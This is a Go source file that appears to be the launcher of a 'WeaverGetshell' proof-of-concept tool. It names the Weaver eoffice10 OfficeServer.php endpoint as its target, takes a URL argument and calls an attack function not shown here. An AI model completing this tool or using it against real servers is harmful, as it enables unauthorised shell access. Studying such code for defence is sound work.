package main

//author:160team.west9B
import (
	"flag"
	"fmt"
)

var (
	url         string
	Eofficepath = "/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
)

func init() {
	flag.StringVar(&url,
		"u",
		"null",
		"url:http://127.0.0.1/",
	)

}
func main() {
	flag.Parse()
	fmt.Println("author:160team.west9b")
	if url != "null" {
		Weaver()
		return
	}
	fmt.Println("usage_poc:WeaverGetshell.exe -u url")
}
